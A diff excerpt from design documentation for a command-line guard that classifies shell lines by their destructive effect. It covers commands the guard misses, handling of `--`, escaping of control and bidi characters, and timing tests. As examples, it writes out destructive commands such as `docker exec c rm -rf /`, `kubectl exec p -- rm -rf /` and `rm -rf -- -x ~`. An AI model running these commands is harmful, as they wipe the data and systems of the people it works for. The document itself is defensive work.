 and `doctl`, `purge-*` for `az`) is a verb only where a verb can be: after a
 verb that takes operands (`deploy`, `create`) such a word is the name of what
@@ -4061,14 +4331,15 @@ the command word after it (`cdk --json destroy`).
 Not read, so the caller has to account for them: a verb that deletes under
 another name (`kubectl patch` removing finalizers, `terraform apply` of a plan
 that destroys, `terraform taint`, `aws s3 mv`, `rclone sync`, which deletes at
-the destination what the source lacks); a program run on another machine (`ssh
-host docker system prune`, `docker exec c rm -rf /`, `kubectl exec p -- rm -rf
-/`); a command a tool reads from a file or its environment (`TF_CLI_ARGS` set
-before the line, or exported by `set -a` and then set by `read`, a `kubectl`
-plugin, a shell alias); a `gh api graphql` mutation that deletes; and a
-resource named like a whole delete verb behind a verb that does not make or set
-it (`gcloud functions deploy delete` reads as a delete, because the guard
-cannot tell the verb from a name that follows).
+the destination what the source lacks, and a cloud module's cmdlet of another
+verb, `Unregister-EC2Image` or `Stop-EC2Instance -Terminate`); a program run
+on another machine (`ssh host docker system prune`, `docker exec c rm -rf /`,
+`kubectl exec p -- rm -rf /`); a command a tool reads from a file or its
+environment (`TF_CLI_ARGS` set before the line, or exported by `set -a` and
+then set by `read`, a `kubectl` plugin, a shell alias); a `gh api graphql`
+mutation that deletes; and a resource named like a whole delete verb behind a
+verb that does not make or set it (`gcloud functions deploy delete` reads as a
+delete, because the guard cannot tell the verb from a name that follows).
 
 ## Reads only
 
@@ -4474,7 +4745,9 @@ when it runs, is `Unknown`.
   setting, unless its name could be one that changes what runs (`PATH`, or in
   zsh `path`).
 - A PowerShell method call (`[IO.File]::ReadAllText(...)`, `$x.Delete()`) is
-  no unit, and the rules know only some of them: it is `Unknown`. A backtick
+  no unit, and the rules know only some of them: it is `Unknown`, also when a
+  rule reads it as the cmdlet it stands for (a `Get-Content` for a .NET read
+  of a file, an `Invoke-RestMethod` for an upload). A backtick
   substitution in an unquoted here-document, which the grammar does not read
   and the shell runs, is read as code by the guard (see Data in a database),
   so it counts for what its commands do, and for `Unknown` when it cannot be
@@ -4614,6 +4887,20 @@ itself (a part that cannot be read, a program known only when it runs, a limit
 hit). Every known argument that is not an option gets a place, whether or not
 the program takes it as a path (`reset` in `git reset` lands inside the
 workspace); which arguments are paths is the rules' business, not the tree's.
+In a POSIX shell nothing after the first `--` is an option: in `rm -- -rf
+~/x` and `rm -rf -- -x ~`, `rm` takes `-rf` and `-x` as files, so they get a
+place and the `--` gets none (a second `--` is a file too). The tree follows
+only a POSIX `--` for now: PowerShell's `--` ends its parameters too, but the
+tree does not read it yet, so a word after it that starts with a dash still
+shows as an option. A cmd `--` ends nothing.
+
+The tree never shows the line's text raw where it could mislead: a control
+character (a newline, a tab, an ESC), a line or paragraph separator (U+2028,
+U+2029) and a Unicode format character (category `Cf`: the bidi controls
+U+202A to U+202E and U+2066 to U+2069, a zero-width space, a byte order mark)
+are written as escapes (`\n`, `\u{1b}`, `\u{202e}`), so the text can neither pose
+as a line of the tree, nor reach a terminal as a sequence, nor show in another
+order than it is read. The fields of `Explanation` keep the text raw.
 
 `classify` is `explain` without the tree: both take their answer from one
 reading of the line (`effect` too, from the same split), so `Explanation::findings`
@@ -4714,7 +5001,10 @@ holds seeded noise that never panics, a line too long or too nested being
 unreadable, a line whose nested scripts are read too often being unreadable,
 too many here-documents, a too-long cmd chain and too-deep nesting not being
 read while everyday lines with many `<<` or `&` are, and the tests that time
-a nasty line against a 200 ms bound;
+a nasty line against a 200 ms bound. Each of them runs `explain` and draws its
+tree too, which do more work than `classify`: a line past a limit is
+unreadable there as well, and `classify`, `explain` and the drawing of the tree
+are each held to the bound;
 `tests/timing.rs` and `tests/limits.rs` hold the rest, as each bullet says:
 
 - **Never panics, and `classify`, `effect` and `explain` agree.** (The wide run
